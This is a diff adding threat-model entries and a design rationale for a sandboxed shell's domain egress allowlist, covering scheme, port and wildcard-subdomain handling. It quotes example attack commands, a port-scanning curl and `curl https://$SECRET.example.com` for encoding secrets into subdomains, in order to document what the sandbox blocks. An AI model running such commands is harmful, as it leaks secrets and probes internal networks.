@@ -428,6 +428,9 @@ allowlist.allow("https://api.example.com");
 | TM-NET-005 | Port scanning | `curl http://internal:$port` | Port must match allowlist | **MITIGATED** |
 | TM-NET-006 | Protocol downgrade | HTTPS → HTTP | Scheme must match | **MITIGATED** |
 | TM-NET-007 | Subdomain bypass | `evil.example.com` | Exact host match | **MITIGATED** |
+| TM-NET-015 | Domain allowlist scheme bypass | `allow_domain()` permits both http and https | By design; use URL patterns for scheme control | **BY DESIGN** |
+| TM-NET-016 | Domain allowlist port bypass | `allow_domain()` permits any port | By design; use URL patterns for port control | **BY DESIGN** |
+| TM-NET-017 | Wildcard subdomain exfiltration | `curl https://$SECRET.example.com` | Wildcards not supported; exact domain match only | **MITIGATED** |
 
 **Current Risk**: LOW - Strict allowlist enforcement
 
@@ -545,6 +548,54 @@ Script: curl https://api.example.com/data
 - 28: Timeout
 - 47: Max redirects exceeded
 - 63: Response too large
+
+#### 5.6 Domain Egress Allowlist Design Rationale
+
+Bashkit's network allowlist uses **literal host matching** — the virtual equivalent of
+SNI (Server Name Indication) filtering on TLS client-hello headers. This is the same
+approach used by production sandbox environments (e.g., Vercel Sandbox) for egress
+control.
+
+**Why not DNS-based filtering?**
+Scripts can hardcode IP addresses, bypassing any DNS-level controls entirely.
+
+**Why not IP-based filtering?**
+A single IP address can host many domains (shared hosting, CDNs, cloud load balancers).
+Blocking/allowing by IP is too coarse-grained.
+
+**Why not an HTTP proxy?**
+Proxies only work for HTTP traffic and require applications to be configured to use them
+(or respect `HTTP_PROXY` env vars). They don't cover other TLS-based protocols like
+database connections.
+
+**Why literal host / SNI matching?**
+SNI filtering inspects the `server_name` extension in the TLS client-hello, which the
+client must send in cleartext before encryption begins. This works for all TLS traffic
+regardless of protocol. Since bashkit controls the HTTP layer and provides no raw socket
+access, literal host matching in the allowlist achieves equivalent coverage — every
+outbound connection goes through the `HttpClient`, which checks the hostname against the
+allowlist before any network I/O occurs.
+
+**Domain allowlist vs URL patterns:**
+
+The `allow_domain()` API provides a simpler interface when callers only need domain-level
+control:
+
+| Capability | `allow_domain()` | `allow()` (URL pattern) |
+|------------|-------------------|-------------------------|
+| Scheme enforcement | No (any scheme) | Yes (exact match) |
+| Port enforcement | No (any port) | Yes (exact match) |
+| Path restriction | No (any path) | Yes (prefix match) |
+| Simplicity | High | Medium |
+
+Callers requiring scheme or port enforcement should use URL patterns (`allow()`) instead
+of domain rules. Both rule types can be combined on the same allowlist; a URL is permitted
+if it matches **either** a domain rule or a URL pattern.
+
+**Wildcard subdomains:**
+Wildcard patterns (e.g., `*.example.com`) are deliberately **not supported**. They enable
+data exfiltration by encoding secrets in subdomains: `curl https://$SECRET.example.com`.
+Only exact domain matches are allowed (TM-NET-017).
 
 ---
 
@@ -834,6 +885,7 @@ This section maps former vulnerability IDs to the new threat ID scheme and track
 | Path normalization | TM-ESC-001, TM-INJ-005 | `fs/memory.rs` | Yes |
 | No symlink following | TM-ESC-002, TM-DOS-011 | `fs/memory.rs` | Yes |
 | Network allowlist | TM-INF-010, TM-NET-001 to TM-NET-007 | `network/allowlist.rs` | Yes |
+| Domain allowlist | TM-NET-015, TM-NET-016, TM-NET-017 | `network/allowlist.rs` | Planned |
 | Sandboxed eval/bash/sh, no exec | TM-ESC-005 to TM-ESC-008, TM-ESC-015, TM-INJ-003 | `interpreter/mod.rs` | Yes |
 | Fail-point testing | All controls | `security_failpoint_tests.rs` | Yes |
 | Builtin panic catching | TM-INT-001, TM-INT-002, TM-INT-006 | `interpreter/mod.rs` | Yes |
